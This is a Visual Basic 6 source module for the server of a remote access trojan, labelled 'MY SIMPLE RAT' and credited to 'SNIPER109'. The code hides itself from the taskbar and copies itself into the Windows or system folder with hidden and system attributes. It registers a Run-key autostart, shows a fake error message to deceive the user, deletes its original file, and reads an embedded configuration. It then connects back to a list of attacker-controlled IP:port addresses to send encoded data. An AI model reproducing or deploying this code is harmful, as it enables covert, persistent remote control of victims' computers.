Attribute VB_Name = "MainModule"
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'

Type SVR
    Name As String
    IPs  As String
    Pass As String
    Inst As String
    Vic  As String
End Type
Public Server As SVR
Public Function SearchMe(ByVal what As String) As String
    On Error Resume Next
    Dim header As String
    header = Decode(Extrahieren("[header]", "[/header]"))
    
    Dim tHead As Variant
    tHead = Split(header, vbCrLf)
    For ii = 0 To UBound(tHead)
        Dim TMP As Variant
        TMP = Split(tHead(ii), "=")
        If LCase(TMP(0)) = LCase(what) Then SearchMe = TMP(1)
    Next ii
End Function
Sub Main()
    On Error Resume Next
    HideMe
    Dim ResCdir As String
    ResCdir = SearchMe("target")
    If LCase(ResCdir) = "windir" Then ResCdir = WINDIR Else ResCdir = SysDir
    Dim TmPPath As String
    If Len(App.Path) = 3 Then TmPPath = App.Path Else TmPPath = App.Path & "\"
        
    If LCase(App.Path) = LCase(ResCdir) Then
        If SearchMe("autostart") <> "" Then
            StartUp.RegRun TmPPath & SearchMe("install"), SearchMe("autostart")
        End If
        'Einstellungen lesen
        LoadConfig
        'Go
        Connect
        'Melt Server
        If SearchMe("melt") = "1" And Command <> "" Then
            Do While Dir(Command) <> ""
                Kill Command
                DoEvents
            Loop
        End If
    Else
        'Evtl. alter Server verhanden, abschieﬂen
        Server.Inst = SearchMe("install")
        
        SetAttr ResCdir & "\" & Server.Inst, vbNormal
        Kill ResCdir & "\" & Server.Inst
        
        'Server kopieren
        FileCopy TmPPath & App.EXEName & ".exe", ResCdir & "\" & Server.Inst
        
        'Fake Error ausgeben
        If SearchMe("fakeerror") <> "" Then
            MsgBox SearchMe("fakeerror"), vbExclamation, ""
        End If
        
        'Datei starten
        If SearchMe("start") <> "" Then
            Shell SearchMe("start"), vbNormalFocus
        End If
        SetAttr ResCdir & "\" & Server.Inst, vbSystem + vbHidden
        'Server starten
        Shell ResCdir & "\" & Server.Inst & " " & TmPPath & App.EXEName & ".exe", vbHide: End
    End If
End Sub
Sub HideMe()
    frmMain.Visible = False
    frmMain.Hide
    App.TaskVisible = False
End Sub
Sub LoadConfig()
    Server.IPs = SearchMe("iplist")
    Server.Name = SearchMe("servername")
    Server.Pass = SearchMe("pass")
    Server.Vic = SearchMe("victim")
End Sub
Public Function Extrahieren(ByVal StartStr As String, ByVal EndStr As String) As String
On Error Resume Next
Dim TEMPstr As String
Dim FileNumber As Long: FileNumber = FreeFile

Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #FileNumber
    TEMPstr = Space$(LOF(FileNumber))
    Get #FileNumber, 1, TEMPstr
Close #FileNumber
 
Dim fnkstart As String: fnkstart = InStr(1, TEMPstr, StartStr)
Dim fnkend As String: fnkend = InStr(1, TEMPstr, EndStr)
Extrahieren = Mid$(TEMPstr, fnkstart + Len(StartStr), fnkend - fnkstart - Len(EndStr) + 1)
End Function
Sub Connect()
    With frmMain
        Dim MAX As String
        Dim TMP1 As Variant
        If InStr(Server.IPs, "*") = 0 Then
            MAX = .wsk.UBound + 1
            Load .wsk(MAX)
            TMP1 = Split(Server.IPs, ":")
            .wsk(MAX).Tag = Server.IPs
            .wsk(MAX).Connect TMP1(0), TMP1(1)
        Else
            Dim t1 As Variant
            t1 = Split(Server.IPs, "*")
            For ii = 0 To UBound(t1)
                MAX = .wsk.UBound + 1
                Load .wsk(MAX)
                TMP1 = Split(t1(ii), ":")
                .wsk(MAX).Tag = t1(ii)
                .wsk(MAX).Connect TMP1(0), TMP1(1)
            Next ii
        End If
    End With
End Sub
Public Sub Senden(ByVal tIndex As Integer, ByVal tData As String)
    On Error Resume Next
    frmMain.wsk(tIndex).SendData Encode(tData & Splitter)
End Sub
